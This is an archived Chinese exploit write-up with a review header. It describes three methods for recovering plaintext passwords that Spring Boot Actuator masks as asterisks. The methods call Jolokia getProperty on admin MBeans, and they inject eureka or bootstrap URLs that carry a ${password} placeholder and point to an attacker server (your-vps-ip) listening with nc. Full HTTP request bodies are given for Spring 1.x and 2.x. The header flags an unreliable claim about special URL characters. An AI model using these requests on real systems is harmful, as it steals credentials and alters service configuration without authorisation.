---
source: "历史归档批(无原始出处标注)"
product: "Spring Actuator/JMX与属性替换"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Spring Boot 获取被星号脱敏的密码的明文"
prerequisites: "来源所述条件，未列明部分仍待核：Boot1/2粗分；AdminMXBean需单独启用、Cloud EnvironmentManager需依赖；无精确版本"
side_effects: "未执行；本文需注意的操作影响：秘密外传和业务状态恢复未说明；把凭据加入URL/Basic发到外部并修改Eureka/bootstrap，日志会留下敏感信息，需限定授权与恢复"
source_status: "unknown"
id: "vw-e22d1a51b9fea569dc746c7b"
entity_id: "ve-e22d1a51b9fea569dc746c7b"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Boot1/2粗分；AdminMXBean需单独启用、Cloud EnvironmentManager需依赖；无精确版本

代码与实验材料：JMX getProperty与Eureka Basic/URL外带请求完整，含依赖前提；外带会改服务URL并泄露敏感值，无恢复

来源证据范围：LandGrey原项目issue1支持第三种思路，正文源头未完整标注

- **适用与权限边界（1）**：JMX调用前提少写注册与授权；依据：仅Jolokia存在并不保证SpringApplication Admin MBean启用或exec允许。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **代码与转录边界（2）**：特殊URL字符兼容性断言不可靠；依据：称bootstrap query适用于特殊URL字符，但#片段、&amp;参数分隔、空格/编码仍可破坏或截断秘密。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **凭据与会话边界（3）**：秘密外传和业务状态恢复未说明；依据：把凭据加入URL/Basic发到外部并修改Eureka/bootstrap，日志会留下敏感信息，需限定授权与恢复。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

获取被星号脱敏的密码的明文 (方法一)
-----------------------------------

> 访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如
> password、secret)的属性名对应的属性值用 \* 号替换达到脱敏的效果

#### 利用条件：

-   目标网站存在 `/jolokia` 或 `/actuator/jolokia` 接口
-   目标使用了 `jolokia-core` 依赖（版本要求暂未知）

#### 利用方法：

##### 步骤一： 找到想要获取的属性名

GET 请求目标网站的 `/env` 或 `/actuator/env` 接口，搜索 `******`
关键词，找到想要获取的被星号 \* 遮掩的属性值对应的属性名。

##### 步骤二： jolokia 调用相关 Mbean 获取明文

将下面示例中的 `security.user.password`
替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的
`value` 键中。

-   调用 `org.springframework.boot` Mbean（**可能更通用**）

> 实际上是调用
> org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar
> 类实例的 getProperty 方法

spring 1.x

    POST /jolokia
    Content-Type: application/json

    {"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}

spring 2.x

    POST /actuator/jolokia
    Content-Type: application/json

    {"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}

-   调用 `org.springframework.cloud.context.environment` Mbean（**需要
    spring cloud 相关依赖**）

> 实际上是调用
> org.springframework.cloud.context.environment.EnvironmentManager
> 类实例的 getProperty 方法

spring 1.x

    POST /jolokia
    Content-Type: application/json

    {"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}

spring 2.x

    POST /actuator/jolokia
    Content-Type: application/json

    {"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}

获取被星号脱敏的密码的明文 (方法二)
-----------------------------------

> 访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如
> password、secret)的属性名对应的属性值用 \* 号替换达到脱敏的效果

#### 利用条件：

-   可以 GET 请求目标网站的 `/env`
-   可以 POST 请求目标网站的 `/env`
-   可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在
    `spring-boot-starter-actuator` 依赖）
-   目标使用了 `spring-cloud-starter-netflix-eureka-client` 依赖
-   目标可以请求攻击者的服务器（请求可出外网）

#### 利用方法：

##### 步骤一： 找到想要获取的属性名

GET 请求目标网站的 `/env` 或 `/actuator/env` 接口，搜索 `******`
关键词，找到想要获取的被星号 \* 遮掩的属性值对应的属性名。

##### 步骤二： 使用 nc 监听 HTTP 请求

在自己控制的外网服务器上监听 80 端口：

    nc -lvk 80

##### 步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性

将下面 `http://value:${security.user.password}@your-vps-ip` 中的
`security.user.password` 换成自己想要获取的对应的星号 \* 遮掩的属性名；

`your-vps-ip` 换成自己外网服务器的真实 ip 地址。

spring 1.x

    POST /env
    Content-Type: application/x-www-form-urlencoded

    eureka.client.serviceUrl.defaultZone=http://value:${security.user.password}@your-vps-ip

spring 2.x

    POST /actuator/env
    Content-Type: application/json

    {"name":"eureka.client.serviceUrl.defaultZone","value":"http://value:${security.user.password}@your-vps-ip"}

##### 步骤四： 刷新配置

spring 1.x

    POST /refresh
    Content-Type: application/x-www-form-urlencoded

spring 2.x

    POST /actuator/refresh
    Content-Type: application/json

##### 步骤五： 解码属性值

正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下
`Authorization` 头内容：

    Authorization: Basic dmFsdWU6MTIzNDU2

将其中的 `dmFsdWU6MTIzNDU2`部分使用 base64 解码，即可获得类似明文值
`value:123456`，其中的 `123456` 即是目标星号 \* 脱敏前的属性值明文。

获取被星号脱敏的密码的明文 (方法三)
-----------------------------------

> 访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如
> password、secret)的属性名对应的属性值用 \* 号替换达到脱敏的效果

#### 利用条件：

-   通过 POST `/env` 设置属性触发目标对外网指定地址发起任意 http 请求
-   目标可以请求攻击者的服务器（请求可出外网）

#### 利用方法：

> 参考 UUUUnotfound 提出的
> [issue-1](https://github.com/LandGrey/SpringBootVulExploit/issues/1)，可以在目标发外部
> http 请求的过程中，在 url path 中利用占位符带出数据

##### 步骤一： 找到想要获取的属性名

GET 请求目标网站的 `/env` 或 `/actuator/env` 接口，搜索 `******`
关键词，找到想要获取的被星号 \* 遮掩的属性值对应的属性名。

##### 步骤二： 使用 nc 监听 HTTP 请求

在自己控制的外网服务器上监听 80 端口：

    nc -lvk 80

##### 步骤三： 触发对外 http 请求

-   `spring.cloud.bootstrap.location`
    方法（**同时适用于**明文数据中有特殊 url 字符的情况）：

spring 1.x

    POST /env
    Content-Type: application/x-www-form-urlencoded

    spring.cloud.bootstrap.location=http://your-vps-ip/?=${security.user.password}

spring 2.x

    POST /actuator/env
    Content-Type: application/json

    {"name":"spring.cloud.bootstrap.location","value":"http://your-vps-ip/?=${security.user.password}"}

-   `eureka.client.serviceUrl.defaultZone`
    方法（**不适用于**明文数据中有特殊 url 字符的情况）：

spring 1.x

    POST /env
    Content-Type: application/x-www-form-urlencoded

    eureka.client.serviceUrl.defaultZone=http://your-vps-ip/${security.user.password}

spring 2.x

    POST /actuator/env
    Content-Type: application/json

    {"name":"eureka.client.serviceUrl.defaultZone","value":"http://your-vps-ip/${security.user.password}"}

##### 步骤四： 刷新配置

spring 1.x

    POST /refresh
    Content-Type: application/x-www-form-urlencoded

spring 2.x

    POST /actuator/refresh
    Content-Type: application/json
